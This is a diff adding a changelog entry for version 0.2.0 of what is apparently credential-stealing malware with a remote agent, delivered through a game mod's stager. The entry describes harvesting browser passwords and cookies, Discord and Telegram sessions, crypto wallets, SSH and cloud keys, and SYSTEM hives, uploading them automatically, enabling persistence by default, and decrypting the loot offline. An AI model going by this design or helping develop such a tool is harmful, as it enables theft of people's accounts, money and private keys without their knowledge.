@@ -1,5 +1,22 @@
 # Changelog
 
+## 0.2.0
+
+- Harvest: newer Discord builds encrypt the stored token, so no plaintext candidate validates. The raw LevelDB files now ship under `discord/raw/` (2 MB budget) instead of being dropped; the DPAPI blobs in `dpapi/` are enough to decrypt them offline.
+- Harvest: `keys.txt` no longer parses `Local State` through PowerShell `ConvertFrom-Json`, which silently failed on Edge. The encrypted key is read in Java and only the DPAPI unwrap is delegated, so Edge gets a key too.
+- Harvest: when the unwrap fails, `keys.txt` keeps the wrapped value as `dpapi_key=` instead of losing it.
+- Harvest: wallet extension data is stored as `wallets/<browser>/<extension>/<profile>` so Chrome, Edge and Brave no longer overwrite each other.
+- Harvest: browser databases now ship with their `-wal` companions, so rows written while the browser is open are no longer lost from the copy.
+- Harvest: total zip budget raised from 8 MB to 12 MB.
+- Mod: dropped the unread `refmap` entry from the mixins config; Loom already remaps the injection points inline and the warning only confused the log.
+- Mod: the stager logs one INFO line when it fires and when it spawns the agent.
+- `decrypt.py` is now a full harvest decryptor: DPAPI masterkeys from the password, browser AES keys, v10 and v20 cookies (with the DPAPI_SYSTEM machinekey), saved passwords, Discord tokens, Exodus/Electrum/Phantom and launcher accounts, styled output and a `report.json`. It parses both the classic and the CNG DPAPI blob layout.
+- `SHELL.md` with the loot one-liners to run over `shell`.
+- `make_fixture.py` builds a synthetic harvest so the decryptor can be exercised end to end without Windows.
+- First run collects itself: a background bootstrap (~45-75 s after the agent starts, Windows only) gathers recon, credentials, Wi-Fi, Discord/Telegram/Steam/Firefox sessions, wallets, SSH and cloud keys, a screenshot and, with one UAC, the SYSTEM hives. Each step uploads separately and leaves a marker, so a crash or a declined UAC only retries the unfinished part; the hives stop after three attempts.
+- First run also turns `persist` and auto-update on by default; `persist off` or `update auto off` still wins afterwards.
+- `shell` is now for specific extras and repairs, see `SHELL.md`.
+
 ## 0.1.4
 
 - Signed agent updates: apply, restart and automatic rollback on startup failure.
